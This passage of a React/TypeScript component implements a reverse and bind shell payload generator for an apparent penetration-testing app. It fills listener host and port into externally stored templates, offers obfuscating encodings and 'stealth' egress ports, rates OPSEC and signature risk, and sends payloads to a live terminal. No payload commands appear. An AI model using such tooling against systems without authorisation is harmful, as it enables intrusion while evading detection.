import React, { useState, useEffect, useMemo, useCallback, useRef } from 'react';
import {
  PayloadTemplate,
  PayloadRenderOptions,
  PayloadRenderResult,
  PayloadFileConfig,
  PayloadOS,
  PayloadEncoding,
} from '../types/payload';
import { CyberIcon } from './CyberIcon';

export interface PayloadGeneratorModalProps {
  onClose: () => void;
  activeSessionId?: string | null;
  activeHostAddress?: string | null;
  onSendToTerminal?: (sessionId: string, text: string) => void;
  // Wails Bindings
  listTemplates: () => Promise<PayloadTemplate[]>;
  saveTemplate: (tmpl: PayloadTemplate) => Promise<void>;
  deleteTemplate: (id: string) => Promise<void>;
  renderPayload: (opts: PayloadRenderOptions) => Promise<PayloadRenderResult>;
  saveAsSnippet: (opts: PayloadRenderOptions, name: string) => Promise<void>;
  getFileConfig: () => Promise<PayloadFileConfig>;
  setFilePath: (path: string) => Promise<PayloadFileConfig>;
  onSelectFile?: (title: string, filterName: string, filterPattern: string) => Promise<string>;
  onSelectDirectory?: (title: string) => Promise<string>;
}

export const PayloadGeneratorModal: React.FC<PayloadGeneratorModalProps> = ({
  onClose,
  activeSessionId,
  activeHostAddress,
  onSendToTerminal,
  listTemplates,
  saveTemplate,
  deleteTemplate,
  renderPayload,
  saveAsSnippet,
  getFileConfig,
  setFilePath,
  onSelectFile,
  onSelectDirectory,
}) => {
  const [templates, setTemplates] = useState<PayloadTemplate[]>([]);
  const [fileConfig, setFileConfig] = useState<PayloadFileConfig | null>(null);
  const [loading, setLoading] = useState<boolean>(true);
  const [error, setError] = useState<string>('');
  const [infoMessage, setInfoMessage] = useState<string>('');

  // Selected template & parameters
  const [selectedTemplateId, setSelectedTemplateId] = useState<string>('');
  const [lhost, setLhost] = useState<string>(activeHostAddress || '10.10.14.1');
  const [lport, setLport] = useState<number>(443);
  const [encoding, setEncoding] = useState<PayloadEncoding>('none');
  const [customVars, setCustomVars] = useState<Record<string, string>>({});

  // Filter states
  const [searchQuery, setSearchQuery] = useState<string>('');
  const [osFilter, setOsFilter] = useState<'all' | PayloadOS>('all');
  const [shellFilter, setShellFilter] = useState<string>('all');
  const [kindFilter, setKindFilter] = useState<string>('all');

  // Render result
  const [renderResult, setRenderResult] = useState<PayloadRenderResult | null>(null);
  const [rendering, setRendering] = useState<boolean>(false);
  const [copyFeedback, setCopyFeedback] = useState<boolean>(false);
  const [savingSnippet, setSavingSnippet] = useState<boolean>(false);

  // Template editor modal
  const [editingTemplate, setEditingTemplate] = useState<PayloadTemplate | null>(null);
  const [savingTemplate, setSavingTemplate] = useState<boolean>(false);
  const commandTextareaRef = useRef<HTMLTextAreaElement | null>(null);

  const handleInsertTemplateVar = (placeholder: string) => {
    setEditingTemplate((prev) => {
      if (!prev) return prev;
      const el = commandTextareaRef.current;
      const currentCmd = prev.command || '';
      if (el) {
        const start = typeof el.selectionStart === 'number' ? el.selectionStart : currentCmd.length;
        const end = typeof el.selectionEnd === 'number' ? el.selectionEnd : currentCmd.length;
        const nextCmd = currentCmd.slice(0, start) + placeholder + currentCmd.slice(end);
        const nextCursor = start + placeholder.length;
        setTimeout(() => {
          const target = commandTextareaRef.current;
          if (target) {
            target.focus();
            target.setSelectionRange(nextCursor, nextCursor);
          }
        }, 0);
        return { ...prev, command: nextCmd };
      }
      setTimeout(() => {
        commandTextareaRef.current?.focus();
      }, 0);
      return { ...prev, command: currentCmd + placeholder };
    });
  };

  // File path configuration dialog
  const [showPathInput, setShowPathInput] = useState<boolean>(false);
  const [customPathValue, setCustomPathValue] = useState<string>('');

  // Load initial templates and file config
  const refreshAll = useCallback(async () => {
    setLoading(true);
    setError('');
    try {
      const [cfg, list] = await Promise.all([getFileConfig(), listTemplates()]);
      setFileConfig(cfg);
      setTemplates(list || []);
      if (list && list.length > 0 && !selectedTemplateId) {
        setSelectedTemplateId(list[0].id);
        if (list[0].defaultPort) {
          setLport(list[0].defaultPort);
        }
      }
    } catch (err: unknown) {
      setError(err instanceof Error ? err.message : String(err));
    } finally {
      setLoading(false);
    }
  }, [getFileConfig, listTemplates, selectedTemplateId]);

  useEffect(() => {
    void refreshAll();
  }, [refreshAll]);

  // Selected template object
  const currentTemplate = useMemo(() => {
    return templates.find((t) => t.id === selectedTemplateId) || null;
  }, [templates, selectedTemplateId]);

  // When selected template changes, update default port if applicable
  const handleSelectTemplate = (tmpl: PayloadTemplate) => {
    setSelectedTemplateId(tmpl.id);
    if (tmpl.defaultPort && tmpl.defaultPort > 0) {
      setLport(tmpl.defaultPort);
    }
  };

  // Dynamically detect any variable placeholders from the command: {{VAR}}
  const detectedVariables = useMemo(() => {
    if (!currentTemplate) return [];
    const set = new Set<string>();
    if (currentTemplate.variables) {
      currentTemplate.variables.forEach((v: unknown) => {
        if (typeof v === 'string') {
          set.add((v as string).toUpperCase());
        } else if (v && typeof v === 'object' && 'name' in v && typeof (v as { name: unknown }).name === 'string') {
          set.add((v as { name: string }).name.toUpperCase());
        }
      });
    }
    const re = /\{\{([A-Za-z0-9_]+)\}\}/g;
    let match;
    while ((match = re.exec(currentTemplate.command || '')) !== null) {
      set.add(match[1].toUpperCase());
    }
    return Array.from(set);
  }, [currentTemplate]);

  const handleBrowseFile = async () => {
    try {
      const file = onSelectFile
        ? await onSelectFile('Select Payload Templates JSON File', 'JSON Files', '*.json')
        : await (window as unknown as { go?: { main?: { App?: { SelectFileDialog: (t: string, fn: string, fp: string) => Promise<string> } } } }).go?.main?.App?.SelectFileDialog?.(
          'Select Payload Templates JSON File',
          'JSON Files',
          '*.json'
        );
      if (file && file.trim()) {
        const updated = await setFilePath(file.trim());
        setFileConfig(updated);
        await refreshAll();
        setInfoMessage(`Loaded template file: ${file.trim()}`);
      }
    } catch (err: unknown) {
      setError(err instanceof Error ? err.message : String(err));
    }
  };

  const handleBrowseFolder = async () => {
    try {
      const folder = onSelectDirectory
        ? await onSelectDirectory('Select Payload Templates Folder')
        : await (window as unknown as { go?: { main?: { App?: { SelectDirectoryDialog: (t: string) => Promise<string> } } } }).go?.main?.App?.SelectDirectoryDialog?.(
          'Select Payload Templates Folder'
        );
      if (folder && folder.trim()) {
        const updated = await setFilePath(folder.trim());
        setFileConfig(updated);
        await refreshAll();
        setInfoMessage(`Configured templates folder: ${folder.trim()} (using default payload_templates.json)`);
      }
    } catch (err: unknown) {
      setError(err instanceof Error ? err.message : String(err));
    }
  };

  // Render active payload whenever parameters change
  useEffect(() => {
    if (!currentTemplate) {
      setRenderResult(null);
      return;
    }

    if (!currentTemplate.command || currentTemplate.command.trim() === '') {
      setRenderResult(null);
      return;
    }

    let isMounted = true;
    setRendering(true);

    const opts: PayloadRenderOptions = {
      templateId: currentTemplate.id,
      lhost,
      lport: Number(lport) || 443,
      encoding,
      customVars,
    };

    renderPayload(opts)
      .then((res) => {
        if (isMounted) {
          setRenderResult(res);
          setError('');
        }
      })
      .catch((err: unknown) => {
        if (isMounted) {
          setError(err instanceof Error ? err.message : String(err));
          setRenderResult(null);
        }
      })
      .finally(() => {
        if (isMounted) {
          setRendering(false);
        }
      });

    return () => {
      isMounted = false;
    };
  }, [currentTemplate, lhost, lport, encoding, customVars, renderPayload]);

  // Filter templates list
  const filteredTemplates = useMemo(() => {
    return templates.filter((t) => {
      if (osFilter !== 'all' && t.os !== osFilter && t.os !== 'any') {
        return false;
      }
      if (shellFilter !== 'all' && t.shell !== shellFilter) {
        return false;
      }
      if (kindFilter !== 'all' && t.kind !== kindFilter) {
        return false;
      }
      if (searchQuery.trim() !== '') {
        const q = searchQuery.toLowerCase();
        const matchesName = t.name.toLowerCase().includes(q);
        const matchesDesc = (t.description || '').toLowerCase().includes(q);
        const matchesShell = t.shell.toLowerCase().includes(q);
        const matchesTags = (t.tags || []).some((tag) => tag.toLowerCase().includes(q));
        if (!matchesName && !matchesDesc && !matchesShell && !matchesTags) {
          return false;
        }
      }
      return true;
    });
  }, [templates, osFilter, shellFilter, kindFilter, searchQuery]);

  // Copy to clipboard
  const handleCopy = async () => {
    if (!renderResult || !renderResult.rendered) return;
    try {
      await navigator.clipboard.writeText(renderResult.rendered);
      setCopyFeedback(true);
      setTimeout(() => setCopyFeedback(false), 2000);
    } catch {
      setError('Failed to copy to clipboard.');
    }
  };

  // Save as snippet
  const handleSaveSnippet = async () => {
    if (!currentTemplate || !renderResult) return;
    setSavingSnippet(true);
    setError('');
    try {
      const opts: PayloadRenderOptions = {
        templateId: currentTemplate.id,
        lhost,
        lport: Number(lport) || 443,
        encoding,
        customVars,
      };
      await saveAsSnippet(opts, `Payload: ${currentTemplate.name}`);
      setInfoMessage(`Payload saved to Vault as snippet successfully.`);
      setTimeout(() => setInfoMessage(''), 3000);
    } catch (err: unknown) {
      setError(err instanceof Error ? err.message : String(err));
    } finally {
      setSavingSnippet(false);
    }
  };

  // Send to active terminal
  const handleSendTerminal = () => {
    if (!renderResult || !activeSessionId || !onSendToTerminal) return;
    onSendToTerminal(activeSessionId, renderResult.rendered + '\n');
    setInfoMessage('Payload sent to active terminal session.');
    setTimeout(() => setInfoMessage(''), 2500);
  };

  // Save template edit
  const handleSaveTemplateForm = async () => {
    if (!editingTemplate) return;
    if (!editingTemplate.name.trim()) {
      setError('Template name cannot be empty.');
      return;
    }
    if (!editingTemplate.command.trim()) {
      setError('Template command cannot be empty. Populate with {{LHOST}} and {{LPORT}} placeholders.');
      return;
    }

    setSavingTemplate(true);
    setError('');
    try {
      await saveTemplate(editingTemplate);
      setEditingTemplate(null);
      await refreshAll();
      setSelectedTemplateId(editingTemplate.id);
      setInfoMessage('Template saved to external templates file.');
      setTimeout(() => setInfoMessage(''), 3000);
    } catch (err: unknown) {
      setError(err instanceof Error ? err.message : String(err));
    } finally {
      setSavingTemplate(false);
    }
  };

  // Delete template
  const handleDeleteTemplate = async (tmpl: PayloadTemplate) => {
    if (!window.confirm(`Delete template "${tmpl.name}" from external templates file?`)) {
      return;
    }
    setError('');
    try {
      await deleteTemplate(tmpl.id);
      await refreshAll();
      setInfoMessage(`Deleted template "${tmpl.name}".`);
      setTimeout(() => setInfoMessage(''), 3000);
    } catch (err: unknown) {
      setError(err instanceof Error ? err.message : String(err));
    }
  };

  // Apply new custom file path
  const handleApplyCustomPath = async () => {
    if (!customPathValue.trim()) return;
    setError('');
    try {
      const cfg = await setFilePath(customPathValue.trim());
      setFileConfig(cfg);
      setShowPathInput(false);
      await refreshAll();
      setInfoMessage('Template file path updated successfully.');
      setTimeout(() => setInfoMessage(''), 3000);
    } catch (err: unknown) {
      setError(err instanceof Error ? err.message : String(err));
    }
  };

  const isStealthPort = lport === 443 || lport === 80 || lport === 53 || lport === 8443;
  const isHighRiskPort = lport === 4444 || lport === 1337 || lport === 31337;

  return (
    <div
      className="modal-backdrop cyber-modal-backdrop"
      onClick={(e) => {
        if (e.target === e.currentTarget && !editingTemplate) onClose();
      }}
    >
      <div
        className="cyber-totp-container is-modal-view"
        style={{ width: '98%', maxWidth: '1220px', maxHeight: '92vh' }}
        onClick={(e) => e.stopPropagation()}
        role="dialog"
        aria-label="Payload Generator"
      >
        {/* Tactical Reticle Corner Overlays */}
        <div className="cyber-corner-reticle cyber-corner-tl" />
        <div className="cyber-corner-reticle cyber-corner-tr" />
        <div className="cyber-corner-reticle cyber-corner-bl" />
        <div className="cyber-corner-reticle cyber-corner-br" />

        {/* Cyberpunk HUD Header Bar */}
        <div className="cyber-totp-hud-header">
          <div className="cyber-hud-title-block">
            <div className="cyber-hud-tag-line">
              <span className="cyber-hazard-stripes">///</span>
              <span className="cyber-hud-tag">OPS-PAYLOAD</span>
              <span className="cyber-hud-delim">//</span>
              <span className="cyber-hud-subtag">SHELL SYNTHESIS MATRIX</span>
            </div>
            <h2 className="cyber-hud-title" style={{ display: 'flex', alignItems: 'center', gap: '0.6rem' }}>
              <CyberIcon name="target" size={20} />
              <span>PAYLOAD GENERATOR // REVERSE &amp; BIND SHELLS</span>
            </h2>
            <div className="cyber-telemetry-strip">
              <span className="cyber-telemetry-chip chip-green" title="Loaded external payload templates">
                <span className="chip-dot" />{' '}
                <strong>{fileConfig ? `${fileConfig.templateCount} TEMPLATES` : '0 TEMPLATES'}</strong>
              </span>
              <span className="cyber-telemetry-chip chip-cyan" title={fileConfig?.filePath}>
                <span className="chip-dot" /> STORE:{' '}
                <strong>
                  {fileConfig?.filePath ? fileConfig.filePath.split(/[\\/]/).slice(-2).join('/') : 'loading...'}
                </strong>
              </span>
              <span
                className={`cyber-telemetry-chip ${isStealthPort ? 'chip-green' : 'chip-amber'}`}
                title="Current LHOST:LPORT target parameters"
              >
                <span className="chip-dot" /> VECTOR: <strong>{lhost}:{lport}</strong>
              </span>
            </div>
          </div>

          <div className="cyber-hud-actions-block">
            <button
              type="button"
              className="cyber-btn cyber-btn-secondary"
              onClick={() => void handleBrowseFile()}
              title="Select a specific payload templates JSON file"
            >
              <CyberIcon name="folder" size={13} />
              <span>Browse File</span>
            </button>
            <button
              type="button"
              className="cyber-btn cyber-btn-secondary"
              onClick={() => void handleBrowseFolder()}
              title="Select a folder (uses default payload_templates.json inside)"
            >
              <CyberIcon name="folder" size={13} />
              <span>Browse Folder</span>
            </button>
            <button
              type="button"
              className="cyber-btn cyber-btn-secondary"
              onClick={() => {
                setCustomPathValue(fileConfig?.filePath || '');
                setShowPathInput(!showPathInput);
              }}
              title="Change templates file path"
            >
              <CyberIcon name="edit" size={13} />
              <span>Config Path</span>
            </button>
            <button
              type="button"
              className="cyber-btn cyber-btn-secondary"
              onClick={() => void refreshAll()}
              title="Reload templates from disk"
            >
              <CyberIcon name="radar" size={13} />
              <span>Reload File</span>
            </button>
            <button
              type="button"
              className="cyber-btn-close"
              onClick={onClose}
              aria-label="Close Payload Generator"
              title="Close Payload Generator"
            >
              <CyberIcon name="close" size={14} />
            </button>
          </div>
        </div>

        {/* Custom Path Edit Expandable */}
        {showPathInput && (
          <div
            style={{
              padding: '0.75rem 1.4rem',
              backgroundColor: 'rgba(10, 22, 42, 0.96)',
              borderBottom: '1px solid rgba(0, 240, 255, 0.3)',
              display: 'flex',
              alignItems: 'center',
              gap: '0.6rem',
              flexWrap: 'wrap',
            }}
          >
            <span style={{ fontSize: '0.74rem', color: '#00f0ff', fontWeight: 700, letterSpacing: '0.06em' }}>
              EXTERNAL FILE OR FOLDER PATH:
            </span>
            <input
              type="text"
              className="cyber-input"
              value={customPathValue}
              onChange={(e) => setCustomPathValue(e.target.value)}
              placeholder="e.g. data/payload_templates.json or folder path"
              style={{ flex: 1, minWidth: '240px', height: '32px' }}
            />
            <button
              type="button"
              className="cyber-btn-sm cyber-btn-secondary"
              onClick={() => void handleBrowseFile()}
              title="Pick file from disk"
            >
              Pick File
            </button>
            <button
              type="button"
              className="cyber-btn-sm cyber-btn-secondary"
              onClick={() => void handleBrowseFolder()}
              title="Pick folder from disk"
            >
              Pick Folder
            </button>
            <button
              type="button"
              className="cyber-btn-sm cyber-btn-primary"
              style={{ height: '30px', padding: '0 0.75rem' }}
              onClick={() => void handleApplyCustomPath()}
            >
              Apply Path
            </button>
            <button
              type="button"
              className="cyber-btn-sm cyber-btn-secondary"
              onClick={() => setShowPathInput(false)}
            >
              Cancel
            </button>
          </div>
        )}

        {/* Alert Notices */}
        {error && (
          <div className="cyber-banner cyber-banner-error" role="alert">
            <span className="banner-icon">
              <CyberIcon name="warning" size={14} />
            </span>
            <span className="banner-text">{error}</span>
            <button type="button" onClick={() => setError('')} className="banner-close-btn">
              <CyberIcon name="close" size={12} />
            </button>
          </div>
        )}
        {infoMessage && (
          <div className="cyber-banner cyber-banner-success" role="status">
            <span className="banner-icon">
              <CyberIcon name="check" size={14} />
            </span>
            <span className="banner-text">{infoMessage}</span>
          </div>
        )}

        {/* Top Control Matrix: LHOST, LPORT, Encoding */}
        <div
          className="cyber-totp-toolbar"
          style={{
            display: 'grid',
            gridTemplateColumns: 'repeat(auto-fit, minmax(240px, 1fr))',
            gap: '1rem',
            alignItems: 'end',
          }}
        >
          {/* LHOST Field */}
          <div className="cyber-field-group">
            <div className="cyber-label" style={{ display: 'flex', justifyContent: 'space-between' }}>
              <span>LHOST / LISTENER IP</span>
              <span style={{ color: '#00f0ff' }}>&#123;&#123;LHOST&#125;&#125;</span>
            </div>
            <div style={{ display: 'flex', gap: '0.4rem' }}>
              <input
                type="text"
                className="cyber-input"
                value={lhost}
                onChange={(e) => setLhost(e.target.value)}
                placeholder="e.g. 10.10.14.1"
                style={{ flex: 1, height: '34px' }}
              />
              {activeHostAddress && (
                <button
                  type="button"
                  className="cyber-pill-btn"
                  onClick={() => setLhost(activeHostAddress)}
                  title={`Use active host IP (${activeHostAddress})`}
                >
                  Active Host
                </button>
              )}
            </div>
          </div>

          {/* LPORT Field & Stealth Presets */}
          <div className="cyber-field-group">
            <div className="cyber-label" style={{ display: 'flex', justifyContent: 'space-between' }}>
              <span>LPORT / LISTENER PORT</span>
              <span style={{ color: '#00f0ff' }}>&#123;&#123;LPORT&#125;&#125;</span>
            </div>
            <div style={{ display: 'flex', gap: '0.4rem', alignItems: 'center', flexWrap: 'wrap' }}>
              <input
                type="number"
                min="1"
                max="65535"
                className="cyber-input"
                value={lport}
                onChange={(e) => setLport(parseInt(e.target.value, 10) || 443)}
                style={{ width: '92px', height: '34px' }}
              />
              <div className="cyber-filter-pills">
                <button
                  type="button"
                  className={`cyber-pill-btn ${lport === 443 ? 'active' : ''}`}
                  onClick={() => setLport(443)}
                  title="HTTPS Egress (Recommended Stealth Port)"
                >
                  443
                </button>
                <button
                  type="button"
                  className={`cyber-pill-btn ${lport === 80 ? 'active' : ''}`}
                  onClick={() => setLport(80)}
                  title="HTTP Egress"
                >
                  80
                </button>
                <button
                  type="button"
                  className={`cyber-pill-btn ${lport === 53 ? 'active' : ''}`}
                  onClick={() => setLport(53)}
                  title="DNS Egress"
                >
                  53
                </button>
                <button
                  type="button"
                  className={`cyber-pill-btn ${lport === 8443 ? 'active' : ''}`}
                  onClick={() => setLport(8443)}
                  title="Alt-HTTPS Egress"
                >
                  8443
                </button>
                <button
                  type="button"
                  className={`cyber-pill-btn ${lport === 4444 ? 'active' : ''}`}
                  onClick={() => setLport(4444)}
                  title="Metasploit default (Signature risk)"
                  style={
                    lport === 4444
                      ? { borderColor: '#ff2a6d', color: '#ff2a6d', background: 'rgba(255, 42, 109, 0.16)' }
                      : { borderColor: 'rgba(255, 42, 109, 0.35)', color: '#fda4af' }
                  }
                >
                  4444
                </button>
              </div>
            </div>
          </div>

          {/* Encoding Option */}
          <div className="cyber-field-group">
            <div className="cyber-label">ENCODING / OBFUSCATION</div>
            <select
              className="cyber-select"
              value={encoding}
              onChange={(e) => setEncoding(e.target.value as PayloadEncoding)}
              style={{ width: '100%', height: '34px' }}
            >
              <option value="none">Raw / None</option>
              <option value="powershell_b64">PowerShell (-EncodedCommand UTF-16LE B64)</option>
              <option value="base64">Standard Base64</option>
              <option value="url">URL Encoded (Query Escape)</option>
              <option value="hex">Hexadecimal</option>
            </select>
          </div>
        </div>

        {/* Dynamic General Ports & Custom Variables Row */}
        {detectedVariables.filter((v) => v !== 'LHOST' && v !== 'LPORT').length > 0 && (
          <div
            style={{
              padding: '0.6rem 1.4rem',
              borderBottom: '1px solid rgba(0, 240, 255, 0.2)',
              backgroundColor: 'rgba(5, 15, 30, 0.9)',
              display: 'flex',
              flexWrap: 'wrap',
              gap: '1rem',
              alignItems: 'center',
            }}
          >
            <div
              style={{
                fontSize: '0.72rem',
                color: '#00f0ff',
                fontWeight: 700,
                display: 'flex',
                alignItems: 'center',
                gap: '0.35rem',
                letterSpacing: '0.06em',
              }}
            >
              <CyberIcon name="terminal" size={12} />
              <span>GENERAL PORTS &amp; PARAMETERS:</span>
            </div>
            {detectedVariables
              .filter((v) => v !== 'LHOST' && v !== 'LPORT')
              .map((varName) => {
                const isPort = varName.includes('PORT');
                const currentVal =
                  customVars[varName] ??
                  (isPort ? (currentTemplate?.defaultPort ? String(currentTemplate.defaultPort) : '443') : '');
                return (
                  <div key={varName} style={{ display: 'flex', alignItems: 'center', gap: '0.4rem' }}>
                    <span style={{ fontSize: '0.72rem', color: '#94a3b8', fontFamily: 'var(--font-mono)' }}>
                      &#123;&#123;{varName}&#125;&#125;:
                    </span>
                    <input
                      type={isPort ? 'number' : 'text'}
                      min={isPort ? '1' : undefined}
                      max={isPort ? '65535' : undefined}
                      className="cyber-input"
                      value={currentVal}
                      onChange={(e) => {
                        const val = e.target.value;
                        setCustomVars((prev) => ({ ...prev, [varName]: val }));
                      }}
                      placeholder={`value for ${varName}`}
                      style={{ width: isPort ? '92px' : '150px', height: '28px', fontSize: '0.76rem' }}
                    />
                    {isPort && (
                      <div className="cyber-filter-pills">
                        {[443, 80, 53, 8443].map((p) => (
                          <button
                            key={p}
                            type="button"
                            className={`cyber-pill-btn ${currentVal === String(p) ? 'active' : ''}`}
                            onClick={() => setCustomVars((prev) => ({ ...prev, [varName]: String(p) }))}
                            style={{ height: '26px', padding: '0 0.45rem', fontSize: '0.66rem' }}
                          >
                            {p}
                          </button>
                        ))}
                      </div>
                    )}
                  </div>
                );
              })}
          </div>
        )}

        {/* Main Content Split: Templates List (Left) & Output / Preview Card (Right) */}
        <div style={{ flex: 1, display: 'flex', minHeight: 0, overflow: 'hidden' }}>
          {/* Left Column: Template Filter & Selector */}
          <div
            style={{
              width: '380px',
              borderRight: '1px solid rgba(0, 240, 255, 0.22)',
              display: 'flex',
              flexDirection: 'column',
              backgroundColor: 'rgba(3, 8, 16, 0.55)',
            }}
          >
            {/* Filter controls */}
            <div
              style={{
                padding: '0.75rem',
                borderBottom: '1px solid rgba(0, 240, 255, 0.15)',
                display: 'flex',
                flexDirection: 'column',
                gap: '0.5rem',
              }}
            >
              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '0.5rem' }}>
                <span style={{ fontSize: '0.7rem', fontWeight: 700, color: '#00f0ff', letterSpacing: '0.07em', fontFamily: 'var(--font-mono)' }}>
                  PAYLOADS ({filteredTemplates.length})
                </span>
                <button
                  type="button"
                  className="cyber-btn cyber-btn-primary cyber-btn-sm"
                  onClick={() => {
                    setEditingTemplate({
                      id: `tmpl-${Date.now()}`,
                      name: '',
                      description: '',
                      os: 'linux',
                      shell: 'bash',
                      kind: 'reverse',
                      command: '',
                      defaultPort: 443,
                      opsecRisk: 'low',
                      notes: '',
                      tags: [],
                    });
                  }}
                  title="Create a new payload template in the external JSON file"
                >
                  <CyberIcon name="plus" size={12} />
                  <span>New Payload</span>
                </button>
              </div>
              <div className="cyber-search-reticle" style={{ minWidth: 'unset', height: '32px' }}>
                <span className="search-prefix">&gt;</span>
                <input
                  type="text"
                  className="cyber-search-input"
                  placeholder="Filter templates..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                />
                {searchQuery && (
                  <button
                    type="button"
                    className="cyber-search-clear"
                    onClick={() => setSearchQuery('')}
                    title="Clear search"
                  >
                    <CyberIcon name="close" size={11} />
                  </button>
                )}
              </div>

              {/* OS, Shell & Kind Filters */}
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '0.35rem' }}>
                <select
                  className="cyber-select"
                  value={osFilter}
                  onChange={(e) => setOsFilter(e.target.value as 'all' | PayloadOS)}
                  style={{ height: '30px', fontSize: '0.72rem', padding: '0 0.4rem' }}
                >
                  <option value="all">OS: All</option>
                  <option value="linux">Linux</option>
                  <option value="windows">Windows</option>
                  <option value="macos">macOS</option>
                  <option value="any">Any OS</option>
                </select>

                <select
                  className="cyber-select"
                  value={shellFilter}
                  onChange={(e) => setShellFilter(e.target.value)}
                  style={{ height: '30px', fontSize: '0.72rem', padding: '0 0.4rem' }}
                >
                  <option value="all">Shell: All</option>
                  <option value="bash">Bash</option>
                  <option value="powershell">PowerShell</option>
                  <option value="python">Python</option>
                  <option value="socat">Socat</option>
                  <option value="nc">Netcat</option>
                  <option value="php">PHP</option>
                  <option value="ruby">Ruby</option>
                  <option value="perl">Perl</option>
                </select>

                <select
                  className="cyber-select"
                  value={kindFilter}
                  onChange={(e) => setKindFilter(e.target.value)}
                  style={{ height: '30px', fontSize: '0.72rem', padding: '0 0.4rem' }}
                >
                  <option value="all">Type: All</option>
                  <option value="reverse">Reverse</option>
                  <option value="bind">Bind</option>
                  <option value="one-liner">One-Liner</option>
                  <option value="msfvenom">Msfvenom</option>
                </select>
              </div>
            </div>

            {/* Template Items Scroll List */}
            <div style={{ flex: 1, overflowY: 'auto', padding: '0.6rem' }}>
              {loading ? (
                <div style={{ padding: '2rem 1rem', textAlign: 'center', color: '#94a3b8', fontSize: '0.8rem' }}>
                  Loading templates from external file...
                </div>
              ) : filteredTemplates.length === 0 ? (
                <div style={{ padding: '2rem 1rem', textAlign: 'center', color: '#64748b', fontSize: '0.78rem' }}>
                  No templates matching filters.
                </div>
              ) : (
                <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem' }}>
                  {filteredTemplates.map((t) => {
                    const isSelected = t.id === selectedTemplateId;
                    const hasCommand = t.command && t.command.trim() !== '';

                    return (
                      <div
                        key={t.id}
                        onClick={() => handleSelectTemplate(t)}
                        style={{
                          padding: '0.65rem 0.8rem',
                          backgroundColor: isSelected ? 'rgba(0, 240, 255, 0.14)' : 'rgba(6, 16, 30, 0.8)',
                          border: isSelected ? '1px solid #00f0ff' : '1px solid rgba(0, 240, 255, 0.18)',
                          clipPath:
                            'polygon(0 0, calc(100% - 10px) 0, 100% 10px, 100% 100%, 10px 100%, 0 calc(100% - 10px))',
                          cursor: 'pointer',
                          transition: 'all 0.15s ease',
                        }}
                      >
                        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                          <span
                            style={{
                              fontSize: '0.82rem',
                              fontWeight: 700,
                              color: isSelected ? '#00f0ff' : '#f1f5f9',
                            }}
                          >
                            {t.name}
                          </span>
                          <span className="card-meta-pill" style={{ textTransform: 'uppercase' }}>
                            {t.os}
                          </span>
                        </div>

                        <div
                          style={{
                            display: 'flex',
                            alignItems: 'center',
                            gap: '0.35rem',
                            marginTop: '0.35rem',
                            flexWrap: 'wrap',
                          }}
                        >
                          <span className="card-meta-pill">{t.shell}</span>
                          <span className="card-meta-pill">{t.kind}</span>
                          {!hasCommand && (
                            <span
                              style={{
                                fontSize: '0.62rem',
                                color: '#f59e0b',
                                backgroundColor: 'rgba(245, 158, 11, 0.15)',
                                border: '1px solid rgba(245, 158, 11, 0.35)',
                                padding: '0.05rem 0.35rem',
                                fontWeight: 700,
                              }}
                            >
                              Ready to Populate
                            </span>
                          )}
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>
          </div>

          {/* Right Column: Selected Template HUD Card, Command Preview & Actions */}
          <div
            style={{
              flex: 1,
              display: 'flex',
              flexDirection: 'column',
              minHeight: 0,
              padding: '1.25rem',
              overflowY: 'auto',
            }}
          >
            {currentTemplate ? (
              <div
                className={`cyber-totp-card ${currentTemplate.opsecRisk === 'high' || isHighRiskPort
                    ? 'card-urgent'
                    : currentTemplate.opsecRisk === 'medium'
                      ? 'card-warning'
                      : ''
                  }`}
                style={{ flex: 1, display: 'flex', flexDirection: 'column', justifyContent: 'space-between' }}
              >
                <div className="card-reticle card-reticle-tl" />
                <div className="card-reticle card-reticle-tr" />
                <div className="card-reticle card-reticle-bl" />
                <div className="card-reticle card-reticle-br" />

                {/* Selected Template Header */}
                <div className="card-top-row" style={{ alignItems: 'flex-start' }}>
                  <div className="card-issuer-monogram">
                    {currentTemplate.shell.slice(0, 2).toUpperCase()}
                  </div>
                  <div className="card-identity-block">
                    <div className="card-service-name" style={{ fontSize: '1rem' }}>
                      {currentTemplate.name}
                    </div>
                    {currentTemplate.description && (
                      <div className="card-account-label" style={{ whiteSpace: 'normal', marginTop: '0.2rem' }}>
                        {currentTemplate.description}
                      </div>
                    )}
                  </div>

                  <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', flexWrap: 'wrap' }}>
                    <span
                      className="card-host-pill"
                      style={{
                        borderColor:
                          currentTemplate.opsecRisk === 'high'
                            ? '#ff2a6d'
                            : currentTemplate.opsecRisk === 'medium'
                              ? '#f59e0b'
                              : '#10b981',
                        color:
                          currentTemplate.opsecRisk === 'high'
                            ? '#ff2a6d'
                            : currentTemplate.opsecRisk === 'medium'
                              ? '#f59e0b'
                              : '#10b981',
                        background:
                          currentTemplate.opsecRisk === 'high'
                            ? 'rgba(255, 42, 109, 0.14)'
                            : currentTemplate.opsecRisk === 'medium'
                              ? 'rgba(245, 158, 11, 0.14)'
                              : 'rgba(16, 185, 129, 0.14)',
                      }}
                    >
                      <span className="pill-pulse" />
                      OPSEC: {currentTemplate.opsecRisk ? currentTemplate.opsecRisk.toUpperCase() : 'LOW'}
                    </span>

                    <button
                      type="button"
                      className="cyber-btn-sm cyber-btn-secondary"
                      onClick={() => setEditingTemplate({ ...currentTemplate })}
                      title="Edit template details or command"
                      style={{ display: 'inline-flex', alignItems: 'center', gap: '0.35rem' }}
                    >
                      <CyberIcon name="edit" size={12} />
                      <span>Edit Template</span>
                    </button>
                    <button
                      type="button"
                      className="cyber-btn-icon btn-delete"
                      onClick={() => void handleDeleteTemplate(currentTemplate)}
                      title="Delete template from external file"
                    >
                      <CyberIcon name="trash" size={13} />
                    </button>
                  </div>
                </div>

                {/* OPSEC Warnings Box (if any) */}
                {renderResult && renderResult.opsecWarnings && renderResult.opsecWarnings.length > 0 && (
                  <div
                    style={{
                      padding: '0.7rem 0.95rem',
                      backgroundColor: 'rgba(245, 158, 11, 0.12)',
                      border: '1px solid rgba(245, 158, 11, 0.45)',
                      color: '#fef08a',
                      fontSize: '0.75rem',
                    }}
                  >
                    <div
                      style={{
                        fontWeight: 800,
                        marginBottom: '0.25rem',
                        display: 'flex',
                        alignItems: 'center',
